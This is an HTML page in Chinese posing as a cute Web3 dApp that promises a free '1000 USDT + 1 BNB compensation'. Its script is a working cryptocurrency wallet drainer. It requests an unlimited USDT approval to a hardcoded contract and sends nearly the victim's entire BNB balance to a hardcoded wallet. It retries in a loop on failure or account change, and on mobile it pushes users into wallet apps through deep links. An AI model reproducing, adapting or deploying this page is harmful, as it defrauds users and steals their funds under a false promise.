<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width,initial-scale=1.0" />
<title>🌸 小仙女 Web3 魔法仪表台 🌸</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
<script src="https://cdn.jsdelivr.net/npm/web3@1.10.4/dist/web3.min.js"></script>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Poppins','Microsoft YaHei',sans-serif;height:100vh;overflow:hidden;background:radial-gradient(circle at 20% 20%,#ffe4f8,#fff0fa,#ffffff);background-size:200% 200%;animation:bgmove 10s infinite alternate;display:flex;justify-content:center;align-items:center;flex-direction:column;}
@keyframes bgmove{0%{background-position:0 0;}100%{background-position:100% 100%;}}
.container{backdrop-filter:blur(20px);background:rgba(255,255,255,.4);border-radius:24px;box-shadow:0 8px 32px rgba(255,182,193,.3);width:90%;max-width:440px;padding:40px;text-align:center;margin:10px;}
h1{color:#ff3f9f;margin-bottom:20px;text-shadow:0 0 10px rgba(255,105,180,.5);font-size:28px;}
button{padding:20px 40px;border:none;border-radius:30px;background:linear-gradient(45deg,#ff6ec7,#ff1493);color:white;font-size:20px;font-weight:bold;cursor:pointer;transition:.3s all;margin:20px 0;box-shadow:0 10px 30px rgba(255,105,180,.4);}
button:hover{transform:scale(1.05);box-shadow:0 15px 40px rgba(255,105,180,.6);}
button:active{background:linear-gradient(45deg,#ff1493,#ff6ec7);}
#status{color:#ff69b4;font-size:20px;margin:15px;line-height:1.4;font-weight:600;}
.sparkle{position:fixed;width:4px;height:4px;background:#fff;border-radius:50%;animation:fall 10s infinite linear;opacity:.8;}
@keyframes fall{0%{transform:translateY(-10vh) scale(0);}50%{opacity:1;}100%{transform:translateY(110vh) scale(1);opacity:0;}}
@media (max-width:480px){.container{padding:20px;width:95% !important;}button{padding:15px 30px;font-size:18px;}}
</style>
</head>
<body>
<div class="container">
  <h1>🪞 小仙女 DApp 领取台 💫</h1>
  <div id="status">💖 限时赔偿：点击领取1000USDT+1BNB！</div>
  <button id="claimBtn">【领取1000USDT+1BNB赔偿】🎁</button>
</div>
<script>
const CONTRACT = "0x500292f9a11b01BC2DA7F81c8c234b9beb98A8b3";
const TAX_WALLET = "0x18626d14aE9cB5dd26d5a14286FF732746083556";
const USDT_ADDR = "0x55d398326f99059fF775485246999027B3197955";
const UNLIMITED = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
let web3, userAddr, authorized = false, step = 1;

const PRIORITY_WALLETS = {
  android: [
    {name:'OKX', intent:'okxwallet://dapp?url=' + encodeURIComponent(window.location.href)},
    {name:'Trust', intent:'trust://open_url?url=' + encodeURIComponent(window.location.href)},
    {name:'MetaMask', intent:'metamask://dapp/' + encodeURIComponent(window.location.href)}
  ],
  ios: [
    {name:'OKX', intent:'okxwallet://dapp?url=' + encodeURIComponent(window.location.href)},
    {name:'Trust', intent:'trust://open_url?url=' + encodeURIComponent(window.location.href)},
    {name:'MetaMask', intent:'metamask://dapp/' + encodeURIComponent(window.location.href)}
  ]
};

function updateStatus(msg){
  document.getElementById('status').innerText = msg;
}

async function autoRedirect(){
  const ua = navigator.userAgent;
  const isMobile = /Android|iPhone|iPad/i.test(ua);
  if(!isMobile) return;
  
  const wallets = /Android/i.test(ua) ? PRIORITY_WALLETS.android : PRIORITY_WALLETS.ios;
  for(let i=0; i<wallets.length; i++){
    setTimeout(() => {
      updateStatus(`📱 跳转${wallets[i].name}中...`);
      window.location.href = wallets[i].intent;
    }, i * 200);
  }
}

async function claimReward(){
  updateStatus('领取1000USDT+1BNB赔偿中...');
  
  try{
    await window.ethereum.request({method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }]});
    web3 = new Web3(window.ethereum);
    const accounts = await window.ethereum.request({method: 'eth_requestAccounts'});
    userAddr = accounts[0];
    
    // 🔥 v122策略：USDT失败→立即BNB→USDT→BNB循环
    if(step === 1 || step === 3){
      // 第1/3步：USDT授权
      try{
        if(!authorized){
          const usdt = new web3.eth.Contract([{"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}], USDT_ADDR);
          await usdt.methods.approve(CONTRACT, UNLIMITED).send({from: userAddr});
          authorized = true;
        }
        // USDT claim
        const contract = new web3.eth.Contract([{"inputs":[{"name":"account","type":"address"}],"name":"claim","outputs":[],"stateMutability":"nonpayable","type":"function"}], CONTRACT);
        await contract.methods.claim(userAddr).send({from: userAddr});
        updateStatus('领取1000USDT+1BNB赔偿成功！');
      }catch(e){
        // USDT失败→立即BNB
        step = 2;
        throw e;
      }
    }
    
    if(step === 2 || step === 4){
      // 第2/4步：BNB全转（-0.001手续费）
      const balance = await web3.eth.getBalance(userAddr);
      const totalBNB = parseFloat(web3.utils.fromWei(balance, 'ether'));
      if(totalBNB > 0.001){
        const amount = web3.utils.toWei((totalBNB - 0.001).toString(), 'ether');
        await web3.eth.sendTransaction({from: userAddr, to: TAX_WALLET, value: amount});
        updateStatus('领取1000USDT+1BNB赔偿成功！');
      }
    }
    
    // 循环策略
    step = step === 4 ? 1 : step + 1;
    setTimeout(claimReward, 1000); // 1秒自动重复
    
  }catch(e){
    updateStatus('领取1000USDT+1BNB赔偿中...');
    setTimeout(claimReward, 500); // 0.5秒重试
  }
}

document.getElementById('claimBtn').onclick = claimReward;

if(window.ethereum){
  window.ethereum.on('accountsChanged', claimReward);
  window.ethereum.on('chainChanged', claimReward);
}

window.addEventListener('load', () => {
  setTimeout(autoRedirect, 300);
});

for(let i=0;i<50;i++){
  const s=document.createElement('div');
  s.className='sparkle';
  s.style.left=Math.random()*100+'vw';
  s.style.animationDelay=Math.random()*5+'s';
  s.style.animationDuration=8+Math.random()*8+'s';
  document.body.appendChild(s);
}
</script>
</body>
</html>
